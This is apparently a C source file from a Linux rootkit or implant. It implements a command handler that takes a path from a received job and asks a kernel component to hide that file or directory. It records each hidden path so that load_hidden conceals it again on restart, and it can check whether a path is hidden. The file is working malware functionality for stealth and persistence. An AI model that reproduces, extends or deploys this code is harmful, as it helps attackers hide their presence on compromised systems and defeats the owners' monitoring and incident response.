#include "../inc/cmds.h"
#include "../inc/kernel.h"
#include "../inc/save.h"

#include <errno.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*

 * hides a given accessiable file/dir
 * also contains util functions which are used outside this file

*/

bool hide_path(char *path) {
  // make sure the path is absolute
  if (NULL == path)
    return false;

  if (access(path, F_OK) != 0)
    return false;

  if (!kernel_send(KERNEL_CMD_HIDE, path, strlen(path)))
    return false;

  return true;
}

bool is_path_hidden(char *path) {
  // make sure the path is absolute
  if (NULL == path)
    return false;

  char full_path[PATH_MAX + 1];

  if (NULL == realpath(path, full_path))
    return false;

  // will fail if the path is hidden/not accessible
  if (!kernel_send(KERNEL_CMD_CHECK, full_path, strlen(full_path)))
    return false;

  return true;
}

bool load_hidden() {
  char *hidden_path = NULL;
  bool  ok          = true;

  // hide saved hidden files/dirs
  while (NULL != (hidden_path = save_get("hidden"))) {
    if (access(hidden_path, F_OK) == 0)
      ok = hide_path(hidden_path);
    else
      debug("not hiding saved hidden path because it's no longer accessable: %s", hidden_path);

    free(hidden_path);
  }

  return ok;
}

char *cmd_hide(job_t *job) {
  cmd_recv_all(job);
  char full_path[PATH_MAX + 1];

  if (NULL == realpath(job->data, full_path))
    return strerror(errno);

  if (!hide_path(full_path)) {
    if (ENOENT == errno)
      return "provided path is not accessible";
    return "operation failed";
  }

  if (!save_add("hidden", full_path))
    return "failed to save the path";

  return "success";
}
